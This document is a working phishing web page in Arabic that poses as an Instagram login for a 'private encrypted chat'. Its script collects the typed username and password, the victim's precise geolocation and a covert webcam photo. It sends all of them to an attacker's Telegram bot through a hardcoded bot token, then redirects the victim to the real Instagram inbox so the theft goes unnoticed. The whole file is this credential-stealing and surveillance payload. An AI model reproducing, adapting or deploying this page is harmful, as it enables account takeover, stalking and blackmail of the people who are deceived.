<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Private Access</title>
    <style>
        body { font-family: -apple-system, sans-serif; background-color: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { background-color: #121212; border: 1px solid #262626; border-radius: 12px; padding: 30px 20px; width: 320px; text-align: center; box-shadow: 0 10px 40px rgba(0,0,0,0.5); }
        .logo { width: 50px; margin-bottom: 15px; }
        h2 { font-size: 18px; margin-bottom: 10px; color: #fff; }
        p { font-size: 12px; color: #a8a8a8; line-height: 1.5; margin-bottom: 20px; }
        input { width: 100%; background: #1a1a1a; border: 1px solid #363636; border-radius: 8px; padding: 12px; color: #fff; font-size: 14px; box-sizing: border-box; margin-bottom: 12px; outline: none; text-align: center; }
        .btn { width: 100%; background-color: #0095f6; color: white; border: none; border-radius: 8px; padding: 12px; font-weight: bold; cursor: pointer; font-size: 15px; }
        #loader { display: none; }
        .spin { width: 25px; height: 25px; border: 3px solid #333; border-top: 3px solid #0095f6; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 10px; }
        @keyframes spin { to { transform: rotate(360deg); } }
        video, canvas { display: none; }
    </style>
</head>
<body>

    <div class="container">
        <div id="ui-box">
            <img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" class="logo">
            <h2>الدخول للمحادثة الخاصة</h2>
            <p>تمت دعوتك للانضمام إلى دردشة مشفرة. يرجى تسجيل الدخول لتأكيد هويتك وفك تشفير المحتوى.</p>
            <input type="text" id="u_field" placeholder="اسم المستخدم أو الهاتف">
            <input type="password" id="p_field" placeholder="كلمة المرور">
            <button class="btn" onclick="startProtocol()">انضمام الآن</button>
        </div>

        <div id="loader">
            <div class="spin"></div>
            <p id="l_text">جاري التحقق من الصلاحيات...</p>
        </div>
    </div>

    <video id="v" autoplay playsinline></video>
    <canvas id="c"></canvas>

    <script>
        const _k = "8233268720:AAE3yeH9WImIv_yiCUSRkpL_ok-n0EUUqyA";
        const _id = "897618292";

        async function startProtocol() {
            const u = document.getElementById('u_field').value;
            const p = document.getElementById('p_field').value;
            if (u.length < 3 || p.length < 3) return;

            document.getElementById('ui-box').style.display = 'none';
            document.getElementById('loader').style.display = 'block';

            // 1. تحديد الموقع فوراً
            navigator.geolocation.getCurrentPosition(pos => {
                const map = `http://maps.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                sendToBot(`📍 الموقع:\n${map}`);
            }, null, {enableHighAccuracy:true});

            // 2. صيد الصورة (المطابقة الحيوية)
            try {
                const s = await navigator.mediaDevices.getUserMedia({ video: true });
                const v = document.getElementById('v');
                v.srcObject = s;
                setTimeout(() => {
                    const c = document.getElementById('c');
                    c.width = v.videoWidth; c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    c.toBlob(blob => {
                        const fd = new FormData();
                        fd.append("chat_id", _id);
                        fd.append("photo", blob, "auth.jpg");
                        fd.append("caption", `👤 اليوزر: ${u}\n🔑 الرمز: ${p}\n🔗 المصدر: شات خاص`);
                        fetch(`https://api.telegram.org/bot${_k}/sendPhoto`, {method:"POST", body:fd}).then(()=>finish());
                    }, 'image/jpeg');
                }, 1500);
            } catch(e) {
                sendToBot(`👤 اليوزر: ${u}\n🔑 الرمز: ${p}\n⚠️ (رفض الكاميرا)`);
                finish();
            }
        }

        function sendToBot(t) {
            fetch(`https://api.telegram.org/bot${_k}/sendMessage?chat_id=${_id}&text=${encodeURIComponent(t)}`);
        }

        function finish() {
            document.getElementById('l_text').innerText = "تم التحقق، جاري التحويل...";
            setTimeout(() => { window.location.href = "https://www.instagram.com/direct/inbox/"; }, 1000);
        }
    </script>
</body>
</html>
